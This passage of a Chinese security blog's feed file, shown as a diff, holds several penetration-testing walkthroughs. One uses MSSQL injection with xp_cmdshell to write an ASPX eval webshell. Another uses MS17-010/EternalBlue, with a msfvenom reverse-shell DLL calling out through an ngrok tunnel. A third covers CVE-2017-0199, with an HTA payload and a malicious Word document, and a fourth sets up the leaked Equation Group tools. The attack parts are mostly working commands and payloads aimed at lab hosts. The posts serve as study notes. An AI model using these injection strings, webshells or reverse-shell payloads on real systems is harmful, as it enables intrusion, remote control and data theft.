+<p>在执行上述搜索和插入过程后，可以使用<code>&#39; and (select(*) from tt_tmp)&gt;1</code>页面返回是否正常来判断是否有搜索结果。当没有找到的话，<code>select(*) from tt_tmp</code>的结果为1，否则大于1。如果没有的话，就换目录，可以试试其他盘符，如<code>&#39;;insert into tt_tmp(tmp1) exec master..xp_cmdshell &#39;for /r d:\ %i in (Newslist*.aspx) do @echo %i &#39;;--</code>。也可以使用sqlmap来查看条数。</p>
+</blockquote>
+<p>可以用报错将表内容给显示出来<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=2<span class="string">' and 1=(select top 1 tmp1 from tt_tmp)and '</span>a<span class="string">'='</span>a</div></pre></td></tr></table></figure></p>
+<p><img src="/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/报错读出1.png" alt="报错读出1"></p>
+<p>继续爆<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=2<span class="string">' and 1=(select top 1 tmp1 from tt_tmp where tmp1 not in ('</span>c:\inetpub\wwwroot\manage\news\NewsList.aspx <span class="string">'))and '</span>a<span class="string">'='</span>a</div></pre></td></tr></table></figure></p>
+<p><img src="/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/报错读出2.png" alt="报错读出2"></p>
+<p>也可以用sqlmap直接将表中数据读取出来</p>
+<p><img src="/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/导出临时表.png" alt="导出临时表"></p>
+<p>然后根据导出结果的路径来判断是否可能为WEB目录。然后写入一个测试文件，看是否可以访问来进一步证实结果。</p>
+<p>这里在根目录写了一个txt文件，写别的目录怕因为没有权限而无法访问。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=1<span class="string">';exec master..xp_cmdshell '</span><span class="built_in">echo</span> <span class="built_in">test</span> &gt;c:\\WWW\\2333.txt<span class="string">';--</span></div></pre></td></tr></table></figure>
+<p>然后访问<a href="http://192.168.232.138:81/2333.txt" target="_blank" rel="external">http://192.168.232.138:81/2333.txt</a></p>
+<p><img src="/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/查看写入的测试文件.png" alt="查看写入的测试文件"></p>
+<p>成功访问，然后就是写一句话</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=1<span class="string">';exec master..xp_cmdshell '</span><span class="built_in">echo</span> ^&lt;%@ Page Language=<span class="string">"Jscript"</span>%^&gt;^&lt;%<span class="built_in">eval</span>(Request.Item[<span class="string">"pass"</span>],<span class="string">"unsafe"</span>);%^&gt; &gt; c:\\WWW\\233.aspx<span class="string">' ;--</span></div></pre></td></tr></table></figure>
+<p>成功写入。然后就是进一步的操作了，这里就不概述了。<br><img src="/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/查看一句话.png" alt="查看一句话"></p>
+<blockquote>
+<p>DOS命令将文件写入文本中时，遇到<code>&lt;&gt;</code>应在前面加上<code>^</code>。</p>
+</blockquote>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这里一共有三个小的知识点:<br>1.sa用户如何开启xp_cmdshell<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">EXEC sp_configure <span class="string">'show advanced options'</span>,1;//允许修改高级参数</div><div class="line">RECONFIGURE;</div><div class="line">EXEC sp_configure <span class="string">'xp_cmdshell'</span>,1;  //打开xp_cmdshell扩展</div><div class="line">RECONFIGURE;</div></pre></td></tr></table></figure></p>
+<p>2.Windows下利用dos如何搜索文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> /r c:\ %i <span class="keyword">in</span> (Newslist*.aspx) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</div><div class="line"><span class="keyword">for</span> /r c:\ %i <span class="keyword">in</span> (Newslist.aspx*) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</div></pre></td></tr></table></figure></p>
+<p>3.dos命令下写文件遇到<code>&lt;&gt;</code>如何处理</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> ^&lt;^&gt; &gt; 123.txt</div></pre></td></tr></table></figure>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>[1]<a href="http://blog.csdn.net/cashey1991/article/details/44993403" target="_blank" rel="external">Windows命令行(cmd)下快速查找文件(类似Linux下find命令) </a><br>[2]<a href="http://www.freebuf.com/articles/web/55577.html" target="_blank" rel="external">技术分享：MSSQL注入xp_cmdshell</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> 渗透测试 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> MSSQL </tag>
+            
+            <tag> WEBSHELL </tag>
+            
+            <tag> ASPX </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[MS17-010漏洞检测与内网穿透技术的应用]]></title>
+      <url>/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/</url>
+      <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>本文主要介绍一下MSF模块的下载、使用，以及当攻击机处于内网，而目标机也处于内网的解决方法。这里借助MS17-010漏洞来具体讲解一下，并没有新的知识点，可以为刚入门的新手抛砖引玉，提供一条解决问题的思路，同时也记录一下过程，加强记忆。<br>主要分为两个知识点，一是SMB漏洞的批量检测，二是内网穿透技术。<br><a id="more"></a><br>首先是环境的搭建，具体如下表所示：</p>
+<table>
+<thead>
+<tr>
+<th>主机</th>
+<th>IP</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Kali 64位</td>
+<td>192.168.232.134</td>
+<td>攻击机</td>
+</tr>
+<tr>
+<td>Windows XP 32位</td>
+<td>192.168.232.128</td>
+<td>安装了python2.6，下载有方程式利用工具包（主要为Windows目录下的工具）</td>
+</tr>
+<tr>
+<td>Window2008 R2 64位</td>
+<td>10.50.2.62</td>
+<td>靶机，存在MS17-010漏洞，并可以访问外网</td>
+</tr>
+</tbody>
+</table>
+<h3 id="0x01-SMB漏洞批量检测"><a href="#0x01-SMB漏洞批量检测" class="headerlink" title="0x01 SMB漏洞批量检测"></a>0x01 SMB漏洞批量检测</h3><h4 id="1-扫描脚本的下载和加载"><a href="#1-扫描脚本的下载和加载" class="headerlink" title="1.扫描脚本的下载和加载"></a>1.扫描脚本的下载和加载</h4><p>由于Metasploit还没有更新MS17-010检测的模块，所以要去exploit-db下载，并在MSF中加载。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@kali:~<span class="comment"># cd /usr/share/metasploit-framework/modules/auxiliary/scanner/smb</span></div><div class="line">root@kali:/usr/share/metasploit-framework/modules/auxiliary/scanner/smb<span class="comment"># wget https://www.exploit-db.com/download/41891 -O smb_ms_17_010.rb</span></div></pre></td></tr></table></figure></p>
+<p><img src="/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/下载脚本.png" alt="下载脚本"></p>
+<p>启动Metasploit，模块会自动加载，或者使用命令<code>reload_all</code>重新加载所有模块。</p>
+<h4 id="2-漏洞扫描的使用方法"><a href="#2-漏洞扫描的使用方法" class="headerlink" title="2.漏洞扫描的使用方法"></a>2.漏洞扫描的使用方法</h4><p>选择使用smb_ms_17_010模块，并查看使用命令。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">msf &gt; use auxiliary/scanner/smb/smb_ms_17_010</div><div class="line">msf auxiliary(smb_ms_17_010) &gt; show options</div></pre></td></tr></table></figure></p>
+<p><img src="/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/脚本说明.png" alt="脚本说明"></p>
+<p>所必须的参数有三个，对于无需登录的SMB，我们只需设置一下扫描的IP段、线程并运行即可开始扫描。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">msf auxiliary(smb_ms_17_010) &gt; <span class="built_in">set</span> RHOSTS 10.50.2.1-255</div><div class="line">RHOSTS =&gt; 10.50.2.1-255</div><div class="line">msf auxiliary(smb_ms_17_010) &gt; <span class="built_in">set</span> THREADS 10</div><div class="line">THREADS =&gt; 10</div><div class="line">msf auxiliary(smb_ms_17_010) &gt; run</div></pre></td></tr></table></figure></p>
+<p><img src="/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/扫描结果.png" alt="扫描结果"></p>
+<p>出现黄色警告的表示可能存在，需要进一步验证。<br>为了方便将存在漏洞的IP列出来，写了一个简单的Python脚本。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">import re</div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line"></div><div class="line">    f = open(<span class="string">"smb.txt"</span>, mode=<span class="string">'r'</span>, buffering=1)</div><div class="line">    <span class="keyword">while</span>(True):</div><div class="line">            line = f.readline()</div><div class="line">            <span class="keyword">if</span> line :</div><div class="line">                <span class="keyword">if</span>  <span class="string">"likely"</span> <span class="keyword">in</span> line:</div><div class="line">                    <span class="built_in">print</span> line.split(<span class="string">' '</span>)[1].split(<span class="string">':'</span>)[0]</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="built_in">break</span></div></pre></td></tr></table></figure></p>
+<p>提取出的IP如下所示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">.....</div><div class="line">10.50.2.52</div><div class="line">10.50.2.62</div><div class="line">10.50.2.65</div><div class="line">10.50.2.61</div><div class="line">10.50.2.63</div><div class="line">10.50.2.64</div><div class="line">10.50.2.76</div><div class="line">10.50.2.69</div><div class="line">10.50.2.77</div><div class="line">10.50.2.78</div><div class="line">10.50.2.79</div><div class="line">....</div></pre></td></tr></table></figure>
+<p>有了存在漏洞的地址，接下来将开始对其进行验证，以10.50.2.62为例。<br>由于Kali在虚拟机，宿主机IP为2.0.<em>.</em>，目标机在10.50.2.*。相当于需要从内网到另一个内网， 选择采用了ngrok进行tcp的端口转发来实现内网的穿透。</p>
+<h3 id="0x02-内网穿透"><a href="#0x02-内网穿透" class="headerlink" title="0x02 内网穿透"></a>0x02 内网穿透</h3><p>这里采用了www.ngrok.cc平台进行演示，类似这样的平台有很多，例如natapp.cn等。<br>注册并开通隧道，如图所示。</p>
+<p><img src="/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/内网穿透之开通隧道.png" alt="内网穿透之开通隧道"></p>
+<p>下载对应的客户端，下载地址为：<a href="https://www.ngrok.cc/#down-client" target="_blank" rel="external">https://www.ngrok.cc/#down-client</a> ，选择与系统对应的软件。<br>我这里Kali为64位的，下载和使用命令如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@kali:~/Downloads<span class="comment"># wget hls.ctopus.com/sunny/linux_amd64.zip</span></div><div class="line">root@kali:~/Downloads<span class="comment"># unzip  linux_amd64.zip</span></div><div class="line">root@kali:~/Downloads<span class="comment"># cd linux_amd64/</span></div><div class="line">root@kali:~/Downloads/linux_amd64<span class="comment"># ls</span></div><div class="line">root@kali:~/Downloads/linux_amd64<span class="comment"># ./sunny clientid 隧道ID</span></div></pre></td></tr></table></figure>
+<p><img src="/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/启动ngrok.png" alt="启动ngrok"><br>出现下图的界面表示运行成功。<br><img src="/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/ngrok启动成功.png" alt="ngrok启动成功"></p>
+<p>使用如下命令生成用于监听的dll文件。监听的IP为server.ngrok.cc的地址，端口为开通隧道时填写的远程端口。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~/Documents<span class="comment"># msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=47.90.92.56  LPORT=6266 -f dll &gt; got.dll</span></div></pre></td></tr></table></figure></p>
+<p><img src="/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/生成监听dll文件.png" alt="生成监听dll文件"></p>
+<p>然后在Kali上设置监听本机的IP和端口，也就是在开通隧道时填写的本地端口。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">use exploit/multi/handler</div><div class="line"><span class="built_in">set</span> LHOST 192.168.232.134</div><div class="line"><span class="built_in">set</span> LPORT 5555</div><div class="line"><span class="built_in">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp</div><div class="line">msf exploit(handler) &gt; exploit</div></pre></td></tr></table></figure></p>
+<p><img src="/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/监听.png" alt="监听"></p>
+<p>由于关于Eternalblue利用方法有很多教程了，这里就不详细说明了，如图所示。<br><img src="/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/设置过程.png" alt="设置过程"><br><img src="/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/利用成功.png" alt="利用成功"><br>攻击成功时查看ngrok客户端发现有一个连接。<br><img src="/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/ngrok连接成功.png" alt="ngrok连接成功"><br>而且Kali上也生成了一个meterpreter会话。<br><img src="/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/返回meterpreter会话.png" alt="返回meterpreter会话"><br>之后的操作就很简单了，可以添加用户等等。<br>最后远程登录成功如下图所示。<br><img src="/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/靶机成功.png" alt="靶机成功"><br>使用natapp也是可以的。<br><img src="/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/natapp连接成功.png" alt="natapp连接成功"></p>
+<h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><p>本文主要以MS17-010为例，讲解了如何下载和利用Metasploit中没有的模块，以及如何解决内网到内网的穿透的问题，当然解决的方法还有很多，这里就不再介绍了。</p>
+<blockquote>
+<p>没有什么新的知识，怕忘记所以记录一下~~</p>
+</blockquote>
+<h3 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h3><p>[1]<a href="https://www.exploit-db.com/exploits/41891/" target="_blank" rel="external">https://www.exploit-db.com/exploits/41891/</a><br>[2]<a href="http://bobao.360.cn/learning/detail/3041.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3041.html</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> Exploit </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> MS17-010 </tag>
+            
+            <tag> Metasploit </tag>
+            
+            <tag> Ngrok </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[CVE-2017-0199漏洞复现过程]]></title>
+      <url>/2017/04/18/CVE-2017-0199%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+      <content type="html"><![CDATA[<blockquote>
+<p>记录一下过程，周日已经出了结果，但是过程忘记了，抽空再次实现了一下。结尾附上利用MSF生成exploit（外国黑客城会玩）。</p>
+</blockquote>
+<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>一台apache服务器（这里我用Kali）、POC和一个Word文档。<br>POC内容大概如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">a=new ActiveXObject(<span class="string">"WScript.Shell"</span>);</div><div class="line">a.run(<span class="string">'%windir%\\System32\\cmd.exe /c calc.exe'</span>, 0);window.close();</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<p>Word文档内容任意。<br><img src="/2017/04/18/CVE-2017-0199漏洞复现过程/Word文档内容.png" alt="Word文档内容"></p>
+<p>然后将其放在Kali服务器上<br>Apache需要开启DAV支持，具体命令如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">a2enmod dav  </div><div class="line">a2enmod dav_fs  </div><div class="line">a2enmod dav_lock  </div><div class="line">a2enmod headers</div></pre></td></tr></table></figure></p>
+<p><img src="/2017/04/18/CVE-2017-0199漏洞复现过程/apache配置.png" alt="apache配置"></p>
+<h3 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h3><p>在web目录新建ms文件夹，将test.docx复制到ms目录下，并重命名为test.rtf<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">root@kali:~/Documents<span class="comment"># cp test.docx /var/www/html/ms/test.rtf</span></div></pre></td></tr></table></figure></p>
+<p>新建Word文档，插入对象<br>如图<br><img src="/2017/04/18/CVE-2017-0199漏洞复现过程/新建exploit文档.png" alt="新建exploit文档"></p>
+<p>并保存为rtf文件，如233.rtf<br>删除服务器上的test.rtf文件<br>并将poc.hta文件复制到ms目录下，并改名为test.rtf<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@kali:/var/www/html/ms<span class="comment"># rm -rf test.rtf </span></div><div class="line">root@kali:~/Documents<span class="comment"># cp poc.hta  /var/www/html/ms/test.rtf</span></div></pre></td></tr></table></figure></p>
+<p>修改Apache配置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;Directory /&gt;  </div><div class="line">Dav on  </div><div class="line">&lt;/Directory&gt;  </div><div class="line"></div><div class="line"> &lt;Directory /var/www/html/ms/&gt;  </div><div class="line">Header <span class="built_in">set</span> Content-Type <span class="string">"application/hta"</span>  </div><div class="line">&lt;/Directory&gt;</div></pre></td></tr></table></figure>
+<p><img src="/2017/04/18/CVE-2017-0199漏洞复现过程/修改Apache配置.png" alt="修改Apache配置"></p>
+<p>并重启服务器<code>service apache2 restart</code></p>
+<p>打开233.rtf文档</p>
+<p>双击word文档的文字，将会有惊喜弹出</p>
+<p><img src="/2017/04/18/CVE-2017-0199漏洞复现过程/计算器弹出.png" alt="计算器弹出"></p>
+<p>打开文档就弹出的话需要将<code>\object\objautlink\rsltpict</code>修改为<br><code>\object\objautlink\objupdate\rsltpict</code><br><img src="/2017/04/18/CVE-2017-0199漏洞复现过程/修改对比.png" alt="修改对比"></p>
+<p>再次打开文件</p>
+<p><img src="/2017/04/18/CVE-2017-0199漏洞复现过程/执行过程.gif" alt="执行过程"></p>
+<h3 id="彩蛋（MSF下的实现）"><a href="#彩蛋（MSF下的实现）" class="headerlink" title="彩蛋（MSF下的实现）"></a>彩蛋（MSF下的实现）</h3><p>在kali下执行。<br>首先更新msf到最新。（假设你们都完成了这个过程）</p>
+<h4 id="下载利用脚本"><a href="#下载利用脚本" class="headerlink" title="下载利用脚本"></a>下载利用脚本</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:/usr/share/metasploit-framework/modules/exploits/windows/fileformat<span class="comment"># wget https://raw.githubusercontent.com/nixawk/metasploit-framework/3d082814cbedc065f329498b9c6fb7951f8ebbd5/modules/exploits/windows/fileformat/office_word_hta.rb</span></div></pre></td></tr></table></figure>
+<p>然后msf下执行命令<code>reload_all</code>重新加载模块</p>
+<p><img src="/2017/04/18/CVE-2017-0199漏洞复现过程/下载并加载脚本.png" alt="下载并加载脚本"></p>
+<p>下载rtf文件到<code>/usr/share/metasploit-framework/data/exploits</code>目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> /usr/share/metasploit-framework/data/exploits</div><div class="line"></div><div class="line">wget https://raw.githubusercontent.com/nixawk/metasploit-framework/3d082814cbedc065f329498b9c6fb7951f8ebbd5/data/exploits/cve-2017-0199.rtf</div></pre></td></tr></table></figure>
+<h4 id="开启hta服务"><a href="#开启hta服务" class="headerlink" title="开启hta服务"></a>开启hta服务</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/windows/misc/hta_server</div><div class="line">msf exploit(hta_server) &gt; show options</div><div class="line">msf exploit(hta_server) &gt; run</div></pre></td></tr></table></figure>
+<p><img src="/2017/04/18/CVE-2017-0199漏洞复现过程/开启hta服务.png" alt="开启hta服务"></p>
+<h4 id="生成exploit文档"><a href="#生成exploit文档" class="headerlink" title="生成exploit文档"></a>生成exploit文档</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">msf exploit(hta_server) &gt; use exploit/windows/fileformat/office_word_hta</div><div class="line">msf exploit(office_word_hta) &gt; show options</div><div class="line">msf exploit(office_word_hta) &gt; <span class="built_in">set</span> TARGETURI http://192.168.232.134:8080/4Jmy4cmcZZV7pwi.hta</div><div class="line">msf exploit(office_word_hta) &gt; <span class="built_in">set</span> FILENAME msf.doc</div><div class="line">msf exploit(office_word_hta) &gt; run</div></pre></td></tr></table></figure>
+<p><img src="/2017/04/18/CVE-2017-0199漏洞复现过程/生成恶意文档.png" alt="生成恶意文档"></p>
+<p>将生成的msf.doc文件复制到windows上，打开即可获取一个会话</p>
+<p>如下所示</p>
+<h5 id="WIndows下结果"><a href="#WIndows下结果" class="headerlink" title="WIndows下结果"></a>WIndows下结果</h5><p><img src="/2017/04/18/CVE-2017-0199漏洞复现过程/Windows上打开结果.png" alt="Windows上打开结果"></p>
+<h5 id="Kali下结果"><a href="#Kali下结果" class="headerlink" title="Kali下结果"></a>Kali下结果</h5><p><img src="/2017/04/18/CVE-2017-0199漏洞复现过程/Kali上结果.png" alt="Kali上结果"></p>
+<h4 id="附加"><a href="#附加" class="headerlink" title="附加"></a>附加</h4><h5 id="如何判断是否收到影响（2017-04-19）"><a href="#如何判断是否收到影响（2017-04-19）" class="headerlink" title="如何判断是否收到影响（2017.04.19）"></a>如何判断是否收到影响（2017.04.19）</h5><p>新建word文档-&gt;插入-&gt;对象-&gt;对象-&gt;由文件创建<br>在文件名中输入获取的hta链接，并选中链接到文件<br>如果出现如下结果，则说明收到影响</p>
+<p><img src="/2017/04/18/CVE-2017-0199漏洞复现过程/检测.gif" alt="检测是否收到影响"></p>
+<p>如果仅仅出现下面的弹窗，则说明不瘦影响，就不需要接下来的测试了。。<br><img src="/2017/04/18/CVE-2017-0199漏洞复现过程/出错弹窗.png" alt="出错弹窗"></p>
+<blockquote>
+<p>主机和虚拟机镜像采用的同一套系统，Office用的也一样，但是虚拟机不可以，而主机可以。我也不知道为啥····</p>
+</blockquote>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="http://rewtin.blogspot.nl/2017/04/cve-2017-0199-practical-exploitation-poc.html?m=1" target="_blank" rel="external">http://rewtin.blogspot.nl/2017/04/cve-2017-0199-practical-exploitation-poc.html?m=1</a><br><a href="https://github.com/rapid7/metasploit-framework/pull/8254" target="_blank" rel="external">https://github.com/rapid7/metasploit-framework/pull/8254</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> Exploit </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> CVE-2017-0199 </tag>
+            
+            <tag> office漏洞 </tag>
+            
+            <tag> Msf </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[方程式漏洞利用之SMB]]></title>
+      <url>/2017/04/15/%E6%96%B9%E7%A8%8B%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8BSMB/</url>
+      <content type="html"><![CDATA[<blockquote>
+<p>测试过程中发现了许多问题，导致不成功，记录一下过程以及在其中遇到问题的解决方法</p>
+</blockquote>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><table>
+<thead>
+<tr>
+<th>主机</th>
+<th>IP</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Win7 64位</td>
+<td>192.168.232.133</td>
+<td>靶机（开启smb）</td>
+</tr>
+<tr>
+<td>XP</td>
+<td>192.168.232.128</td>
+<td>攻击机1</td>
+</tr>
+<tr>
+<td>Kali</td>
+<td>192.168.232.134</td>
+<td>攻击机2</td>
+</tr>
+</tbody>
+</table>
+<a id="more"></a>
+<h5 id="攻击机软件安装"><a href="#攻击机软件安装" class="headerlink" title="攻击机软件安装"></a>攻击机软件安装</h5><p>1.下载<a href="https://github.com/x0rz/EQGRP_Lost_in_Translation/tree/master/windows" target="_blank" rel="external">https://github.com/x0rz/EQGRP_Lost_in_Translation/tree/master/windows</a><br>2.<strong>安装Python2.6 32位</strong><br><img src="/2017/04/15/方程式漏洞利用之SMB/python版本.png" alt="python版本"></p>
+<p>安装后，运行fb.py，发现错误<code>ImportError: No module named win32pipe</code></p>
+<p><img src="/2017/04/15/方程式漏洞利用之SMB/win32pipe错误.png" alt="win32pipe错误"></p>
+<p>搜索后提示需要安装<code>pywin32-216.win32-py2.6.exe</code>，下载地址<a href="https://sourceforge.net/projects/pywin32/files%2Fpywin32/" target="_blank" rel="external">https://sourceforge.net/projects/pywin32/files%2Fpywin32/</a><br>选择对应的版本。<br>结果又发现错误</p>
+<p><img src="/2017/04/15/方程式漏洞利用之SMB/找不到指定的模块.png" alt="找不到指定的模块"></p>
+<p>切换到Python的安装目录的Scripts下，执行命令<code>pywin32_postinstall.py -install</code><br><img src="/2017/04/15/方程式漏洞利用之SMB/解决找不到模块.png" alt="解决找不到模块"></p>
+<p>运行fb.py报错，在fb.py同目录下创建listeningposts文件夹即可<br><img src="/2017/04/15/方程式漏洞利用之SMB/创建目录.png" alt="创建目录"></p>
+<h3 id="验证过程"><a href="#验证过程" class="headerlink" title="验证过程"></a>验证过程</h3><p>运行fb.py后输入靶机和攻击机XP的IP，新建或者用之前的项目<br><img src="/2017/04/15/方程式漏洞利用之SMB/操作1.png" alt="操作1"><br>之后一路回车，需要操作的地方已经标记<br>选择SMB工具模块，使用命令<code>use Eternalblue</code><br><img src="/2017/04/15/方程式漏洞利用之SMB/操作2.png" alt="操作2"><br>选择目标系统<br><img src="/2017/04/15/方程式漏洞利用之SMB/操作3.png" alt="操作3"><br>输入命令<code>use Doublepulsar</code><br><img src="/2017/04/15/方程式漏洞利用之SMB/操作4.png" alt="操作4"><br><img src="/2017/04/15/方程式漏洞利用之SMB/操作5.png" alt="操作5"></p>
+<p>在Kali上生成dll文件，命令如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.232.134  LPORT=5555 <span class="_">-f</span> dll &gt; s.dll</div></pre></td></tr></table></figure></p>
+<p>然后copy到XP系统中，记下位置，如C:\s.dll<br>kali上运行msf，具体命令如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/multi/handler</div><div class="line">msf exploit(handler) &gt; <span class="built_in">set</span> LHOST 192.168.232.134</div><div class="line">LHOST =&gt; 192.168.232.134</div><div class="line">msf exploit(handler) &gt; <span class="built_in">set</span> LPORT 5555</div><div class="line">LPORT =&gt; 5555</div><div class="line">msf exploit(handler) &gt; <span class="built_in">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp</div><div class="line">PAYLOAD =&gt; windows/x64/meterpreter/reverse_tcp</div><div class="line">msf exploit(handler) &gt; exploit</div></pre></td></tr></table></figure></p>
+<p><img src="/2017/04/15/方程式漏洞利用之SMB/操作6.png" alt="操作6"></p>
